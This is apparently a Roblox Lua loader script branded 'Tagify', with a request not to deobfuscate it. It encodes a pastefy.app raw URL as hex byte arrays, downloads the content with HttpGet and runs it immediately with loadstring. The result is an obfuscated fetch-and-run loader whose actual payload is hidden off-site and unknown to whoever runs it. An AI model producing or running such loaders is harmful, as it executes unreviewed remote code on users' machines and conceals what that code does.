--[[

___________              .__  _____       
\__    ___/____     ____ |__|/ ____\__.__ 
  |    |  \__  \   / ___\|  \   __<   |  |
  |    |   / __ \_/ /_/  >  ||  |  \___  |
  |____|  (____  /\___  /|__||__|  / ____|
               \//_____/           \/     
               
               @A_Raidi | sobre2is
               Don't deobfuscate plz
              
]]

--i dont get why would you want to crack ts 😂

local _ = string
local a = {0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f}
local b = {0x70,0x61,0x73,0x74,0x65,0x66,0x79,0x2e,0x61,0x70,0x70}
local c = {0x2f,0x4f,0x4f,0x37,0x50,0x53,0x6b,0x77,0x79}
local d = {0x2f,0x72,0x61,0x77}

local function x(t)
    local s = ""
    for i = 1, #t do
        s = s .. _.char(t[i])
    end
    return s
end

loadstring(game:HttpGet(x(a) .. x(b) .. x(c) .. x(d)))()
